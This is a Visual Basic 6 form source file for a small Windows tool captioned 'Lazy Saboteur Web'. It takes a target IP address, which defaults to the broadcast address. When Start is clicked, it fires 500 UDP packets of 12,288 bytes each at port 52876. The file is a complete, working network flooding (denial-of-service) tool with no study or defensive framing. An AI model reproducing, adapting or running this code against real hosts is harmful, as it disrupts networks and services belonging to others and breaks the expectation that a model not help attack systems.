VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Lazy Saboteur Web"
   ClientHeight    =   3195
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   4680
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3195
   ScaleWidth      =   4680
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton cmdExit 
      Caption         =   "Exit"
      Height          =   375
      Left            =   3480
      TabIndex        =   4
      Top             =   2520
      Width           =   1095
   End
   Begin VB.TextBox txtStatus 
      Height          =   1935
      Left            =   720
      MultiLine       =   -1  'True
      TabIndex        =   3
      Top             =   480
      Width           =   3855
   End
   Begin VB.TextBox txtTarget 
      Height          =   285
      Left            =   720
      TabIndex        =   1
      Text            =   "255.255.255.255"
      Top             =   120
      Width           =   3855
   End
   Begin VB.CommandButton cmdStart 
      Caption         =   "Start"
      Height          =   375
      Left            =   720
      TabIndex        =   0
      Top             =   2520
      Width           =   1095
   End
   Begin MSWinsockLib.Winsock WSOCK 
      Left            =   4200
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
      RemoteHost      =   "255.255.255.255"
      RemotePort      =   52876
   End
   Begin VB.Label Label1 
      Caption         =   "Target:"
      Height          =   255
      Left            =   120
      TabIndex        =   2
      Top             =   120
      Width           =   615
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub cmdExit_Click()
End
End Sub

Private Sub cmdStart_Click()
Dim Tmp As Long
cmdStart.Enabled = False
WSOCK.RemoteHost = Trim(txtTarget.Text)

For Tmp = 1 To 500
    WSOCK.SendData (Space$(12288))
Next Tmp

cmdStart.Enabled = True
End Sub

Private Sub Form_Unload(Cancel As Integer)
WSOCK.Close
End Sub



